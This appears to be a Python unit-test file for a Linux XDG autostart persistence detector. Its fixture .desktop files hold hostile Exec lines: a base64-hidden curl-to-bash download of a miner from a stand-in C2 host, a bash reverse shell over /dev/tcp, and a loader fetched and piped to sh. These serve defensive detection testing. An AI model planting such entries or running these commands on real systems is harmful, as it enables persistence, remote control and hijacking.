# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Unit tests for Linux XDG Desktop Autostart parser."""

from __future__ import annotations

import os
import tempfile

from src.utils.linux_autostart import LinuxAutostartParser, analyze_autostart
from src.utils.models import AnalysisTarget, RiskLevel


def test_user_autostart_evil_desktop():
    """Test user autostart ~/.config/autostart/evil.desktop detection."""
    content = """[Desktop Entry]
Type=Application
Name=Evil Agent
Exec=/home/user/bin/evil_agent --background
TryExec=/home/user/bin/evil_agent
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
    vpath = "/home/user/.config/autostart/evil.desktop"
    with tempfile.NamedTemporaryFile("w+", delete=False) as tf:
        tf.write(content)
        tf.flush()
        temp_path = tf.name

    try:
        target = AnalysisTarget(virtual_paths={vpath: temp_path})
        findings = analyze_autostart(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.category == "xdg_autostart"
        assert finding.technique_id == "T1547.013"
        assert finding.path == vpath
        assert finding.risk_level == RiskLevel.MEDIUM
        assert "USER_XDG_AUTOSTART" in finding.details["flags"]
        assert finding.details["user"] == "user"
        assert finding.details["name"] == "Evil Agent"
        assert finding.details["exec"] == "/home/user/bin/evil_agent --background"
        assert finding.details["try_exec"] == "/home/user/bin/evil_agent"
        assert finding.details["type"] == "Application"
        assert finding.details["hidden"] == "false"
        assert bool(finding.details["hidden"]) is False
        assert finding.details["no_display"] == "false"
        assert bool(finding.details["no_display"]) is False
        assert finding.details["autostart_enabled"] == "true"
        assert bool(finding.details["autostart_enabled"]) is True
        assert finding.raw_content == content
    finally:
        os.unlink(temp_path)


def test_system_autostart_points_to_user_home():
    """Test system autostart /etc/xdg/autostart/helper.desktop pointing to /home/user/bin/agent."""
    content = """[Desktop Entry]
Type=Application
Name=System Helper
Exec=/home/user/bin/agent --start
TryExec=/home/user/bin/agent
Hidden=false
"""
    vpath = "/etc/xdg/autostart/helper.desktop"
    with tempfile.NamedTemporaryFile("w+", delete=False) as tf:
        tf.write(content)
        tf.flush()
        temp_path = tf.name

    try:
        target = AnalysisTarget(virtual_paths={vpath: temp_path})
        findings = analyze_autostart(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.category == "xdg_autostart"
        assert finding.technique_id == "T1547.013"
        assert finding.path == vpath
        assert finding.risk_level == RiskLevel.CRITICAL

        flags = finding.details["flags"]
        assert "SYSTEM_AUTOSTART_POINTS_TO_USER_HOME" in flags
        assert "NON_ROOT_USER_PATH" in flags
        assert finding.details["target_binary_path"] == "/home/user/bin/agent"
    finally:
        os.unlink(temp_path)


def test_base64_payload_and_obfuscated_command():
    """Test base64-encoded execution string inside autostart Exec line."""
    # Base64 string for "id && whoami"
    content = """[Desktop Entry]
Type=Application
Name=Updater
Exec=sh -c "echo 'aWQgJiYgd2hvYW1p' | base64 -d | sh"
"""
    vpath = "/home/victim/.config/autostart/updater.desktop"
    with tempfile.NamedTemporaryFile("w+", delete=False) as tf:
        tf.write(content)
        tf.flush()
        temp_path = tf.name

    try:
        target = AnalysisTarget(virtual_paths={vpath: temp_path})
        findings = analyze_autostart(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.category == "xdg_autostart"
        assert finding.risk_level == RiskLevel.HIGH

        flags = finding.details["flags"]
        assert "USER_XDG_AUTOSTART" in flags
        assert "BASE64_PAYLOAD" in flags
        assert "OBFUSCATED_COMMAND" in flags
        assert "SUSPICIOUS_SHELL_EXECUTION" in flags

        assert finding.decoded_payload == "id && whoami"
        assert finding.details["decoded_payload"] == "id && whoami"
    finally:
        os.unlink(temp_path)


def test_base64_payload_with_nested_download_cradle():
    """Test base64 payload containing a download cradle."""
    # Base64 string for "curl -s http://c2.example.com/miner.sh | bash"
    content = """[Desktop Entry]
Type=Application
Name=Audio Service
Exec=/bin/bash -c "echo 'Y3VybCAtcyBodHRwOi8vYzIuZXhhbXBsZS5jb20vbWluZXIuc2ggfCBiYXNo' | base64 -d | bash"
"""
    vpath = "/etc/xdg/autostart/audio-daemon.desktop"
    with tempfile.NamedTemporaryFile("w+", delete=False) as tf:
        tf.write(content)
        tf.flush()
        temp_path = tf.name

    try:
        target = AnalysisTarget(virtual_paths={vpath: temp_path})
        findings = analyze_autostart(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.risk_level == RiskLevel.HIGH

        flags = finding.details["flags"]
        assert "BASE64_PAYLOAD" in flags
        assert "OBFUSCATED_COMMAND" in flags
        assert "DOWNLOAD_CRADLE" in flags
        assert "SUSPICIOUS_SHELL_EXECUTION" in flags
        assert (
            finding.decoded_payload == "curl -s http://c2.example.com/miner.sh | bash"
        )
    finally:
        os.unlink(temp_path)


def test_reverse_shell_pattern():
    """Test reverse shell execution pattern in autostart entry."""
    content = """[Desktop Entry]
Type=Application
Name=Network Sync
Exec=/bin/bash -c "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1"
"""
    vpath = "/home/victim/.config/autostart/sync.desktop"
    with tempfile.NamedTemporaryFile("w+", delete=False) as tf:
        tf.write(content)
        tf.flush()
        temp_path = tf.name

    try:
        target = AnalysisTarget(virtual_paths={vpath: temp_path})
        findings = analyze_autostart(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.risk_level == RiskLevel.CRITICAL
        flags = finding.details["flags"]
        assert "REVERSE_SHELL_PATTERN" in flags
        assert "SUSPICIOUS_SHELL_EXECUTION" in flags
        assert "USER_XDG_AUTOSTART" in flags
    finally:
        os.unlink(temp_path)


def test_download_cradle_direct():
    """Test direct download cradle pattern (curl pipe to bash)."""
    content = """[Desktop Entry]
Type=Application
Name=Sync Service
Exec=sh -c "curl -s http://malicious.internal/loader.sh | sh"
"""
    vpath = "/home/user/.config/autostart/loader.desktop"
    with tempfile.NamedTemporaryFile("w+", delete=False) as tf:
        tf.write(content)
        tf.flush()
        temp_path = tf.name

    try:
        target = AnalysisTarget(virtual_paths={vpath: temp_path})
        findings = analyze_autostart(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.risk_level == RiskLevel.HIGH
        flags = finding.details["flags"]
        assert "DOWNLOAD_CRADLE" in flags
        assert "SUSPICIOUS_SHELL_EXECUTION" in flags
    finally:
        os.unlink(temp_path)


def test_exec_from_tmp_and_dev_shm():
    """Test execution from /tmp, /var/tmp, and /dev/shm."""
    entries = [
        ("/etc/xdg/autostart/tmp1.desktop", "Exec=/tmp/daemon\n"),
        ("/etc/xdg/autostart/tmp2.desktop", "Exec=/var/tmp/miner --run\n"),
        ("/etc/xdg/autostart/tmp3.desktop", "Exec=/dev/shm/.stealth/proc\n"),
    ]
    virtual_paths: dict[str, str] = {}
    temp_files: list[str] = []

    try:
        for vpath, exec_line in entries:
            content = f"[Desktop Entry]\nType=Application\nName=Service\n{exec_line}"
            with tempfile.NamedTemporaryFile("w+", delete=False) as tf:
                tf.write(content)
                tf.flush()
                temp_files.append(tf.name)
                virtual_paths[vpath] = tf.name

        target = AnalysisTarget(virtual_paths=virtual_paths)
        findings = analyze_autostart(target)

        assert len(findings) == 3
        for finding in findings:
            assert "EXEC_FROM_TMP_OR_DEV_SHM" in finding.details["flags"]
            assert finding.risk_level in (RiskLevel.HIGH, RiskLevel.CRITICAL)

        # /dev/shm/.stealth/proc also has hidden directory .stealth
        shm_finding = next(
            f for f in findings if f.path == "/etc/xdg/autostart/tmp3.desktop"
        )
        assert "HIDDEN_PATH_EXECUTION" in shm_finding.details["flags"]
    finally:
        for tf_path in temp_files:
            os.unlink(tf_path)


def test_hidden_path_execution():
    """Test execution pointing to hidden path components (/.something)."""
    content = """[Desktop Entry]
Type=Application
Name=Background Helper
Exec=/home/alice/.hidden_bin/runner --silent
"""
    vpath = "/home/alice/.config/autostart/helper.desktop"
    with tempfile.NamedTemporaryFile("w+", delete=False) as tf:
        tf.write(content)
        tf.flush()
        temp_path = tf.name

    try:
        target = AnalysisTarget(virtual_paths={vpath: temp_path})
        findings = analyze_autostart(target)

        assert len(findings) == 1
        finding = findings[0]
        assert "HIDDEN_PATH_EXECUTION" in finding.details["flags"]
        assert "USER_XDG_AUTOSTART" in finding.details["flags"]
        assert finding.details["user"] == "alice"
        assert finding.risk_level == RiskLevel.HIGH
    finally:
        os.unlink(temp_path)


def test_root_user_autostart():
    """Test autostart entry under /root/.config/autostart/."""
    content = """[Desktop Entry]
Type=Application
Name=Root Backup
Exec=/root/scripts/backup.sh
"""
    vpath = "/root/.config/autostart/backup.desktop"
    with tempfile.NamedTemporaryFile("w+", delete=False) as tf:
        tf.write(content)
        tf.flush()
        temp_path = tf.name

    try:
        target = AnalysisTarget(virtual_paths={vpath: temp_path})
        findings = analyze_autostart(target)

        assert len(findings) == 1
        finding = findings[0]
        assert "USER_XDG_AUTOSTART" in finding.details["flags"]
        assert finding.details["user"] == "root"
    finally:
        os.unlink(temp_path)


def test_standard_system_autostart_benign():
    """Test benign system autostart with standard binary path."""
    content = """[Desktop Entry]
Type=Application
Name=GNOME Settings Daemon
Exec=/usr/libexec/gsd-xsettings
TryExec=/usr/libexec/gsd-xsettings
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
    vpath = "/etc/xdg/autostart/org.gnome.SettingsDaemon.desktop"
    with tempfile.NamedTemporaryFile("w+", delete=False) as tf:
        tf.write(content)
        tf.flush()
        temp_path = tf.name

    try:
        target = AnalysisTarget(virtual_paths={vpath: temp_path})
        findings = analyze_autostart(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.risk_level == RiskLevel.INFO
        assert finding.details["flags"] == []
        assert finding.details["name"] == "GNOME Settings Daemon"
        assert finding.details["exec"] == "/usr/libexec/gsd-xsettings"
        assert finding.details["no_display"] == "true"
        assert bool(finding.details["no_display"]) is True
        assert finding.details["autostart_enabled"] == "true"
        assert bool(finding.details["autostart_enabled"]) is True
    finally:
        os.unlink(temp_path)


def test_filesystem_root_path_scan():
    """Test scanning a filesystem tree via AnalysisTarget.root_path."""
    with tempfile.TemporaryDirectory() as root_dir:
        # Create directory hierarchy
        sys_dir = os.path.join(root_dir, "etc", "xdg", "autostart")
        user_dir = os.path.join(root_dir, "home", "bob", ".config", "autostart")
        os.makedirs(sys_dir, exist_ok=True)
        os.makedirs(user_dir, exist_ok=True)

        sys_file = os.path.join(sys_dir, "cross.desktop")
        with open(sys_file, "w") as f:
            f.write(
                "[Desktop Entry]\n"
                "Type=Application\n"
                "Name=CrossBoundary\n"
                "Exec=/home/bob/agent.sh\n"
            )

        user_file = os.path.join(user_dir, "clean.desktop")
        with open(user_file, "w") as f:
            f.write(
                "[Desktop Entry]\n"
                "Type=Application\n"
                "Name=CleanApp\n"
                "Exec=/usr/bin/cleanapp\n"
            )

        target = AnalysisTarget(root_path=root_dir)
        findings = LinuxAutostartParser.parse(target)

        assert len(findings) == 2
        sys_finding = next(
            f for f in findings if f.path == "/etc/xdg/autostart/cross.desktop"
        )
        user_finding = next(
            f for f in findings if f.path == "/home/bob/.config/autostart/clean.desktop"
        )

        assert "SYSTEM_AUTOSTART_POINTS_TO_USER_HOME" in sys_finding.details["flags"]
        assert "NON_ROOT_USER_PATH" in sys_finding.details["flags"]
        assert sys_finding.risk_level == RiskLevel.CRITICAL

        assert "USER_XDG_AUTOSTART" in user_finding.details["flags"]
        assert user_finding.details["user"] == "bob"


def test_empty_target_returns_empty_findings():
    """Test that an empty target produces zero findings."""
    target = AnalysisTarget()
    findings = analyze_autostart(target)
    assert findings == []
